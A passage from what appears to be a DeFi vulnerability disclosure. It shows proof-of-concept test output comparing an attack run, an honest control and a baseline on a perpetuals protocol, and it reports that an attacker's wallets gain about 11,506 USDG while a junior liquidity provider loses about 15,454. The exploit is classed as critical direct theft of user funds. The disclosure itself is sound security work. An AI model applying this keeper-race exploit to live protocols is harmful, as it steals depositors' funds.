     round 6 (adverse 30 bps): attacker does nothing; the keeper's execution at commit + 3 s fails PlannerRejected, refunded; order P&L -0.200000
     attacker wallets after withdrawing everything: 331505.692691; victim LP_J Junior value: 9985165.261182
  -- CONTROL: same orders, no arm, a keeper fills each at commit + 1 s
     open: LONG 3792500.000000 USDG notional, the largest that fits under the solvency line (skew cap 4004000.660416); switch lot 1000.000000
     round 1 (adverse 30 bps): keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price; order P&L -14795.517389
     round 2 (favorable 30 bps): keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price; order P&L +7947.226758
     round 3 (adverse 30 bps): keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price; order P&L -14802.539559
     round 4 (favorable 30 bps): keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price; order P&L +7951.177307
     round 5 (favorable 30 bps): keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price; order P&L +7929.342604
     round 6 (adverse 30 bps): keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price; order P&L -14768.599079
     attacker wallets after withdrawing everything: 299470.793570; victim LP_J Junior value: 10012036.191841
  -- BASELINE: no orders
     round 1 (adverse 30 bps): no order; order P&L +0.000000
     round 2 (favorable 30 bps): no order; order P&L +0.000000
     round 3 (adverse 30 bps): no order; order P&L +0.000000
     round 4 (favorable 30 bps): no order; order P&L +0.000000
     round 5 (favorable 30 bps): no order; order P&L +0.000000
     round 6 (adverse 30 bps): no order; order P&L +0.000000
     attacker wallets after withdrawing everything: 319999.999993; victim LP_J Junior value: 10000619.650908
      account                       before                after                 delta
      ATTACKER wallets (3)          320000.000000         331505.692691         +11505.692691
      VICTIM LP_J Junior value      10000619.650908       9985165.261182        -15454.389726
      (VICTIM before = its Junior value in the no-trading baseline over the same hours)
  IMPACT row: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical)
  IMPACT attacker net, withdrawn to its own wallets after 6 rounds: +11505.692691 USDG
  IMPACT victim LP_J Junior value vs the no-trading baseline: -15454.389726 USDG; vs the honest control: -26870.930659 USDG
  IMPACT keeper race: 4 of 4 keeper executions of an armed open refunded it, 2 of them before the attacker saw any move; worst unexercised order P&L -0.200000 USDG
  IMPACT exercised rounds 2 and 5: +8116.261759 and +8095.049696 USDG; the hedge SHORT cost -4694.747262 USDG over the run
  IMPACT the same 6 orders without the arm, keeper filling at commit + 1 s: -20529.206430 USDG

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.36s (2.35s CPU time)

Ran 1 test suite in 2.37s (2.36s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The attacker's three wallets end at 331,505.692691 USDG from 320,000.000000 USDG, +11,505.692691 USDG, and victim LP_J's Junior is worth 15,454.389726 USDG less than with no trading.

